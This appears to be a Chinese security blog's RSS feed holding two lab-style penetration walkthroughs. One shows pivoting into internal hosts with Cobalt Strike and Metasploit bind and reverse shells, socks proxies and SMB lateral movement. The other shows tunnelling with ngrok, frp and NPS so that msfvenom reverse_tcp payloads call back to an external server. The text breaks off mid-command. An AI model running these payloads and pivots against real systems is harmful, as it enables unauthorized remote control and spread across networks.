&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402133020619.png&#34; alt=&#34;image-20240402133020619&#34;&gt;&lt;/p&gt;
&lt;p&gt;设置好以后即可访问 10 网段&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402133137882.png&#34; alt=&#34;image-20240402133137882&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402133218115.png&#34; alt=&#34;image-20240402133218115&#34;&gt;&lt;/p&gt;
&lt;p&gt;也可以添加规则，默认全部走 socks 代理&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402134404125.png&#34; alt=&#34;image-20240402134404125&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;cs正反shell上线内网主机&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cs正反shell上线内网主机&#34;&gt;#&lt;/a&gt; CS 正反 shell 上线内网主机&lt;/h4&gt;
&lt;p&gt;12server 是内网主机无法上网所以是找不到我们的公网 kali 主机无法上线，但是我们拿到了 web 主机，他是可以和 12server 通信的，可以制作一个正向木马让 12server 执行后流量转发到本机的 5555 端口再让 web 主机去主动连接 12server 的 5555 端口就可以实现上线了&lt;/p&gt;
&lt;p&gt;新建立一个监听并创建一个木马并放到 12server 执行&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402160446950.png&#34; alt=&#34;image-20240402160446950&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402160554427.png&#34; alt=&#34;image-20240402160554427&#34;&gt;&lt;/p&gt;
&lt;p&gt;在 web 主机的 shell 上输入 connect 10.10.10.134 5555 让他去连接 12server 的 5555，图中可看到是经过了 web 那台主机上线的&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402161147077.png&#34; alt=&#34;image-20240402161147077&#34;&gt;&lt;/p&gt;
&lt;p&gt;现在获取了 12server 的权限在内网环境中还存在一个 win10 主机我们是无法通信的，可以在 12server 上做一个 socks 代理&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403152728968.png&#34; alt=&#34;image-20240403152728968&#34;&gt;&lt;/p&gt;
&lt;p&gt;此时内网 win10 主机的网站是无法访问的&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403152903425.png&#34; alt=&#34;image-20240403152903425&#34;&gt;&lt;/p&gt;
&lt;p&gt;挂上代理之后就可以访问到了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403153042000.png&#34; alt=&#34;image-20240403153042000&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;msf正反shell上线内网主机&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf正反shell上线内网主机&#34;&gt;#&lt;/a&gt; MSF 正反 shell 上线内网主机&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;生成正向shell&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msfvenom &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; windows/x64/meterpreter/bind_tcp &lt;span class=&#34;token assign-left variable&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6767&lt;/span&gt; &lt;span class=&#34;token assign-left variable&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.0&lt;/span&gt;.0.0 &lt;span class=&#34;token parameter variable&#34;&gt;-f&lt;/span&gt; exe &lt;span class=&#34;token parameter variable&#34;&gt;-o&lt;/span&gt; bind.exe&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;把这个木马放在12server执行&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;kali切换到windows/x64/meterpreter/bind_tcp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; payload windows/x64/meterpreter/bind_tcp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; lport &lt;span class=&#34;token number&#34;&gt;6767&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; rhost &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.10.134 12server的地址&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;run&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403161741174.png&#34; alt=&#34;image-20240403161741174&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403161546975.png&#34; alt=&#34;image-20240403161546975&#34;&gt;&lt;/p&gt;
&lt;p&gt;搭建 socks 代理让可以访问到内网 win10&lt;/p&gt;
&lt;p&gt;进入 sessions 2&lt;/p&gt;
&lt;p&gt;添加 win 的 192.168.0.0 网段路由&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403161933298.png&#34; alt=&#34;image-20240403161933298&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403162051963.png&#34; alt=&#34;image-20240403162051963&#34;&gt;&lt;/p&gt;
&lt;p&gt;background 会话放置后台&lt;/p&gt;
&lt;p&gt;进入 socks 模块&lt;/p&gt;
&lt;p&gt;use auxiliary/server/socks_proxy&lt;/p&gt;
&lt;p&gt;set lport 6666&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403163309671.png&#34; alt=&#34;image-20240403163309671&#34;&gt;&lt;/p&gt;
&lt;p&gt;vim proxvim /etc/proxychains.conf 设置好配置的端口就可以用 nmap 对 win10 进行扫描了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403163246928.png&#34; alt=&#34;image-20240403163246928&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403163443593.png&#34; alt=&#34;image-20240403163443593&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;有防火墙限制的上线&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#有防火墙限制的上线&#34;&gt;#&lt;/a&gt; 有防火墙限制的上线&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240407153756849.png&#34; alt=&#34;image-20240407153756849&#34;&gt;&lt;/p&gt;
&lt;p&gt;前面步骤一样 win10 多了防火墙不能再用正向，可在 12server 做转发上线让 win10 主动找 12server 然后 12server 把 0.145 得到的会话转发到 10.134 网段就可以上线&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240407154157041.png&#34; alt=&#34;image-20240407154157041&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240407155607089.png&#34; alt=&#34;image-20240407155607089&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240407155502201.png&#34; alt=&#34;image-20240407155502201&#34;&gt;&lt;/p&gt;
&lt;p&gt;接着在新建的 333 会话生成木马放在 win10 上线&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240407160824882.png&#34; alt=&#34;image-20240407160824882&#34;&gt;&lt;/p&gt;
&lt;p&gt;图中可看到 win10 主动找的 12server 这样就不受 win10 防火墙限制&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240407160941500.png&#34; alt=&#34;image-20240407160941500&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;smb横向移动隧道搭建&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#smb横向移动隧道搭建&#34;&gt;#&lt;/a&gt; SMB 横向移动隧道搭建&lt;/h3&gt;
&lt;p&gt;扫描 192.168.55.0/24 网段主机的 445 端口&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240415173049574.png&#34; alt=&#34;image-20240415173049574&#34;&gt;&lt;/p&gt;
&lt;p&gt;打开目标列表可看到有 192.168.55.200 也就是最后一台主机 win11&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240415173143210.png&#34; alt=&#34;image-20240415173143210&#34;&gt;&lt;/p&gt;
&lt;p&gt;新建一个 SMB 监听&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240415173244741.png&#34; alt=&#34;image-20240415173244741&#34;&gt;&lt;/p&gt;
&lt;p&gt;对 win11 进行横向&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240415173729146.png&#34; alt=&#34;image-20240415173729146&#34;&gt;&lt;/p&gt;
&lt;p&gt;选择刚创建的监听器密码账号前期信息收集或通过渗透前几台主机获取的&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240415184114001.png&#34; alt=&#34;image-20240415184114001&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功通过 SMB 隧道上线&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240415184143950.png&#34; alt=&#34;image-20240415184143950&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://gyzero.shop/2022/05/02/network-security/neiwang/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</guid>
            <title>内网穿透</title>
            <link>http://gyzero.shop/2022/05/02/network-security/neiwang/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</link>
            <pubDate>Mon, 02 May 2022 13:16:20 +0800</pubDate>
            <description><![CDATA[ &lt;h3 id=&#34;内网穿透简介&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#内网穿透简介&#34;&gt;#&lt;/a&gt; 内网穿透简介&lt;/h3&gt;
&lt;p&gt;内网穿透是一种网络技术，允许从公共互联网访问位于私有网络内部的设备或服务。其原理涉及两个主要概念：端口映射和数据包转发。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;端口映射（Port Forwarding）&lt;/strong&gt;：内网穿透通过将公网 IP 地址上的特定端口映射到内部网络中的设备或服务来实现。当来自公网的数据包到达公网 IP 地址上的特定端口时，路由器或穿透工具会将这些数据包转发到内部网络的目标设备或服务上。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;数据包转发&lt;/strong&gt;：当数据包从公网传入时，穿透工具或路由器将这些数据包接收并重新打包，然后将它们转发到内部网络。这种转发通常是基于某种协议或规则的，以确保数据包按照预期的方式到达目标设备。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240502161516470.png&#34; alt=&#34;image-20240502161516470&#34;&gt;&lt;/p&gt;
&lt;p&gt;图中我们的 kali 是不可访问目标主机的因为都在不同的内网中但是双方都可以访问公网，这时我们可以把内网 msf 监听的端口映射到在公网的服务器上，然后内网 web 主机访问公网这台服务器，这台服务器就会把 web 主机的流量发送到我们内网 kali 的端口上&lt;/p&gt;
&lt;p&gt;内网穿透工具有很多种例如 ngrok 花生壳，frp，nps，spp 等&lt;/p&gt;
&lt;h3 id=&#34;ngrok内网穿透&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ngrok内网穿透&#34;&gt;#&lt;/a&gt; ngrok 内网穿透&lt;/h3&gt;
&lt;p&gt;此安全性不高&lt;/p&gt;
&lt;p&gt;&lt;code&gt;https://www.ngrok.cc/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;注册登陆以后开通隧道&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240502165307805.png&#34; alt=&#34;image-20240502165307805&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以选择收费或免费的，隧道协议支持 http，https，tcp 隧道名随意端口选择可用的，本地端口填写我们 kali 监听的 IP 和端口&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240502165531443.png&#34; alt=&#34;image-20240502165531443&#34;&gt;&lt;/p&gt;
&lt;p&gt;接着下载客户端&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240502165708915.png&#34; alt=&#34;image-20240502165708915&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240502165731414.png&#34; alt=&#34;image-20240502165731414&#34;&gt;&lt;/p&gt;
&lt;p&gt;接着在 kali 中执行./sunny clientid 隧道 ID&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240502165902533.png&#34; alt=&#34;image-20240502165902533&#34;&gt;&lt;/p&gt;
&lt;p&gt;kali 生成木马 msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=10174 LHOST = 填写刚才的域名 -f exe -o msf3.exe&lt;/p&gt;
&lt;p&gt;msf 监听本地的 8888 端口，接着放在 web 主机上运行即可上线&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240502170128206.png&#34; alt=&#34;image-20240502170128206&#34;&gt;&lt;/p&gt;
&lt;p&gt;web 主机运行木马后会将流量转发到公网的 10174 端口接着公网服务器会将流量转发到 kali 的 8888 端口完成内网穿透&lt;/p&gt;
&lt;h3 id=&#34;frp内网穿透&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#frp内网穿透&#34;&gt;#&lt;/a&gt; frp 内网穿透&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;https://github.com/fatedier/frp/releases&lt;/code&gt;  地址&lt;/p&gt;
&lt;p&gt;解压后得到以下文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240502182842898.png&#34; alt=&#34;image-20240502182842898&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;frpc&lt;/code&gt;  和 &lt;code&gt;frpc.toml&lt;/code&gt;  为客户端文件也就是内网 kali 要用到的， &lt;code&gt;frps&lt;/code&gt;  和 &lt;code&gt;frps.toml&lt;/code&gt;  为服务端文件也就是公网服务器&lt;/p&gt;
&lt;p&gt;&lt;code&gt;frps.toml&lt;/code&gt;  内容为其中 7000 是服务端的端口可以自定义为想要的端口但是客户端配置文件中要和服务端设置的端口一致&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240502183034277.png&#34; alt=&#34;image-20240502183034277&#34;&gt;&lt;/p&gt;
&lt;p&gt;客户端配置 &lt;code&gt;frpc.toml&lt;/code&gt;  记得要把公网服务器 9999，5555 端口防火墙放行&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;serverAddr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;公网ip&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;serverPort &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;9999&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;proxies&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;test-tcp&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;tcp&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;localIP &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;192.168.0.109&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;localPort &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4444&lt;/span&gt; 本地监听端口&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;remotePort &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5555&lt;/span&gt; 服务端通过本端口将流量传输到kali的4444端口&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240502214513948.png&#34; alt=&#34;image-20240502214513948&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来 kali 和服务器分别运行 &lt;code&gt;./frpc -c frpc.toml&lt;/code&gt;  和 &lt;code&gt;./frps -c frps.toml&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240502215143420.png&#34; alt=&#34;image-20240502215143420&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240502215202362.png&#34; alt=&#34;image-20240502215202362&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来 msf 生成木马&lt;/p&gt;
&lt;p&gt;&lt;code&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=5555 LHOST=公网ip -f exe -o msf4.exe&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;set lhost 192.168.0.107 set lport 4444 run&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;监听本地 4444 端口&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240502220356577.png&#34; alt=&#34;image-20240502220356577&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;nps穿透代理服务器搭建&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#nps穿透代理服务器搭建&#34;&gt;#&lt;/a&gt; NPS 穿透代理服务器搭建&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;https://github.com/ehang-io/nps/releases/tag/v0.26.10&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;解压后进入 conf 目录编辑 nps.conf 配置文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240503111427655.png&#34; alt=&#34;image-20240503111427655&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240503111627986.png&#34; alt=&#34;image-20240503111627986&#34;&gt;&lt;/p&gt;
&lt;p&gt;分别是 web 登录的账号密码以及端口&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240503112002846.png&#34; alt=&#34;image-20240503112002846&#34;&gt;&lt;/p&gt;
&lt;p&gt;IP 加端口就可以访问 web 端了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240503112055655.png&#34; alt=&#34;image-20240503112055655&#34;&gt;&lt;/p&gt;
&lt;p&gt;登陆进去后客服端点击新增，密钥不填会随机生成&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240503112432911.png&#34; alt=&#34;image-20240503112432911&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240503112717129.png&#34; alt=&#34;image-20240503112717129&#34;&gt;&lt;/p&gt;
&lt;p&gt;kali 下载客户端&lt;/p&gt;
&lt;p&gt;运行客户端命令进行连接，接着配置隧道客户端 ID 就是上面那个，目标 IP 就是我们的 kali 监听的端口 ip&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240503113101659.png&#34; alt=&#34;image-20240503113101659&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240503113238877.png&#34; alt=&#34;image-20240503113238877&#34;&gt;&lt;/p&gt;
&lt;p&gt;接着生成木马 kali 监听本地 4444 端口&lt;/p&gt;
&lt;p&gt;记得生成的木马 ip 端口为公网 IP 和上面的 9898 端口，目标运行后即可上线&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msfvenom &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; windows/x64/meterpreter/reverse_tcp &lt;span class=&#34;token assign-left variable&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;9898&lt;/span&gt; &lt;span class=&#34;token assign-left variable&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;124.222&lt;/span&gt;.120.187 &lt;span class=&#34;token parameter 